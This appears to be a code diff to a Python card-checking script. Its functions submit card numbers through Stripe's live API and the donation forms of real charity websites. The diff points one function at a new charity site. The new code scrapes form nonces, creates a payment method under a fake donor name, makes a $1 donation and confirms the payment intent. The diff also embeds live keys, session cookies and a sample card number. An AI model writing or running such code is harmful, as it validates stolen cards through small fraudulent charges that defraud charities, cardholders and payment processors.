@@ -3408,7 +3408,7 @@ def go17(cc_input: str) -> str:
             data=data,
         )
         if "errors" in response.text:
-            result2 = response.json(['errors'])
+            result2 = response.json()['errors']
         else:
             result2 = response.text
         return result2
@@ -3438,9 +3438,35 @@ def go18(cc_input: str) -> str:
         sess = generate_random_code()
 
 #        proxy = get_random_proxy()
-#        print(f"Using proxy: {proxy['http']}")
-        	
+#        print(f"Using proxy: {proxy['http']}")  
+      
         #1
+        headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': user,
+        }
+        response = requests.get('https://boilerhousespaces.com/campaigns/the-good-place-pantry/', headers=headers)
+        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
+        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
+        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
+        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
+        print(f"G18 ID Response: {form_id}")
+        print(f"G18 ID Response: {donation_nonce}")
+        print(f"G18 ID Response: {campaign_id}")
+        print(f"G18 ID Response: {donation_id}")
+        	
+        #2
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -3457,7 +3483,7 @@ def go18(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F882aee1fe0%3B+stripe-js-v3%2F882aee1fe0%3B+card-element&referrer=https%3A%2F%2Falliesagainstbullying.org&time_on_page=46071&client_attribution_metadata[client_session_id]=eddceaa6-2913-439f-90fc-34935c2fd830&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51S5dV81FwZjXFTOYUE8mMplzJeJuL48X1D7EJyBIeKQ9rv8cwZCJxG4Pp6tGGr6NEQQAGmCWsEKdtAmqLHpaynzU000kQeHaJh'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=GB&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F54f4dc48dc%3B+stripe-js-v3%2F54f4dc48dc%3B+card-element&referrer=https%3A%2F%2Fboilerhousespaces.com&time_on_page=35812&client_attribution_metadata[client_session_id]=e1acf16c-a669-4fa3-a22d-76e81f0f5cef&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SaDgw8aGJtOt5jNqsQM6KsKAwQsPBrnifOUyFGYwAxtEbmQtkGzTqsZ1rvzL7yRCSCSPUJ6XUIwMknD0hiRzMi8005LECx6z1'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -3467,20 +3493,27 @@ def go18(cc_input: str) -> str:
             print("Failed to get payment method.")
             return
                 
-        #2
+        #3
         cookies = {
-            '__stripe_mid': '1720b155-55b8-4bb5-a429-30093d73cddcf37282',
-            '__stripe_sid': '8d04b9d6-3904-4399-8262-4a7aa22400b84ea2eb',
+            'cookieyes-consent': 'consentid:QkMzRTVzc2w3eWJPM3ptTXBUY1AwRUdyaTVlenJtTUg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
+            '__stripe_mid': '82c6a1e8-ca5c-4926-ab52-285bc5625904114010',
+            '_gauges_unique_month': '1',
+            '_gauges_unique_year': '1',
+            '_gauges_unique': '1',
+            'charitable_session': 'd209971a78628f114599520254b82625||86400||82800',
+            '_gauges_unique_hour': '1',
+            '_gauges_unique_day': '1',
+            '__stripe_sid': '4da75479-4f05-414a-a41a-478a158c8b23ce901f',
         }
         
         headers = {
-            'authority': 'alliesagainstbullying.org',
-            'accept': '*/*',
+            'authority': 'boilerhousespaces.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '__stripe_mid=1720b155-55b8-4bb5-a429-30093d73cddcf37282; __stripe_sid=8d04b9d6-3904-4399-8262-4a7aa22400b84ea2eb',
-            'origin': 'https://alliesagainstbullying.org',
-            'referer': 'https://alliesagainstbullying.org/give/',
+            # 'cookie': 'cookieyes-consent=consentid:QkMzRTVzc2w3eWJPM3ptTXBUY1AwRUdyaTVlenJtTUg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; __stripe_mid=82c6a1e8-ca5c-4926-ab52-285bc5625904114010; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; charitable_session=d209971a78628f114599520254b82625||86400||82800; _gauges_unique_hour=1; _gauges_unique_day=1; __stripe_sid=4da75479-4f05-414a-a41a-478a158c8b23ce901f',
+            'origin': 'https://boilerhousespaces.com',
+            'referer': 'https://boilerhousespaces.com/campaigns/the-good-place-pantry/',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -3491,28 +3524,85 @@ def go18(cc_input: str) -> str:
             'x-requested-with': 'XMLHttpRequest',
         }
         
-        params = {
-            't': '1767744250157',
-        }
-        
         data = {
-            'data': f'__fluent_form_embded_post_id=31812&_fluentform_11_fluentformnonce=b3b15c8b9a&_wp_http_referer=%2Fgive%2F&custom-payment-amount_1=1&payment_input_2=4&payment_input_3=0&payment_input_3_custom_0=&payment_method_1=stripe&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&address1%5Baddress_line_1%5D=&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=&address1%5Bstate%5D=&address1%5Bzip%5D=&address1%5Bcountry%5D=&alt_s=&luwzrc885=898300&payment_input%5B%5D=&__stripe_payment_method_id={pm}',
-            'action': 'fluentform_submit',
-            'form_id': '11',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/campaigns/the-good-place-pantry/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'The Good Place Pantry',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'GB',
+            'phone': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
         
-        response = requests.post(
-            'https://alliesagainstbullying.org/wp-admin/admin-ajax.php',
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            data=data,
-        )
-        if "errors" in response.text:
-            result2 = response.json(['errors'])
+        response = requests.post('https://boilerhousespaces.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        if "secret" in response.text:
+            print("✅ req3 required. Continue with next step...")
+            response_str = response.text
+            response = json.loads(response_str)
+            secret = response.get("secret")
+            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
+            match = re.match(pattern, secret)
+            if match:
+            	full_secret = secret
+            	prefix = match.group(1)
+            	print("Full secret:", full_secret)
+            	print("Prefix:", prefix)
+            else:
+            	print("No match found")
+            	
+            #4
+            headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'pragma': 'no-cache',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': user,
+            }
+            data = {
+    'expected_payment_method_type': 'card',
+    'use_stripe_sdk': 'true',
+    'key': 'pk_live_51SaDgw8aGJtOt5jNqsQM6KsKAwQsPBrnifOUyFGYwAxtEbmQtkGzTqsZ1rvzL7yRCSCSPUJ6XUIwMknD0hiRzMi8005LECx6z1',
+    'client_secret': full_secret,
+            }
+            response = requests.post(
+    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
+    headers=headers,
+    data=data,
+            )                        
+            # message
+            result2 = response.text                      	
+            return result2 #stop
+            	
         else:
+            print("❌ Payment no need Rq4. Stopping here.")
             result2 = response.text
-        return result2
+            return result2  #stop
             
     except Exception as e:
         print(f"Error occurred: {e}")
@@ -3613,7 +3703,7 @@ def go19(cc_input: str) -> str:
         )
         
         if "errors" in response.text:
-            result2 = response.json(['errors'])
+            result2 = response.json()['errors']
         else:
             result2 = response.text
         return result2
@@ -3624,22 +3714,3 @@ def go19(cc_input: str) -> str:
         
 #test_card = "4342564062186261|12|27|925"
 #print(go0(test_card))
-#print(go1(test_card))
-#print(go2(test_card))
-#print(go3(test_card))
-#print(go4(test_card))
-#print(go5(test_card))
-#print(go6(test_card))
-#print(go7(test_card))
-#print(go8(test_card))
-#print(go9(test_card))
-#print(go10(test_card))
-#print(go11(test_card))
-#print(go12(test_card))
-#print(go13(test_card))
-#print(go14(test_card))
-#print(go15(test_card))
-#print(go16(test_card))
-#print(go17(test_card))
-#print(go18(test_card))
-#print(go19(test_card))
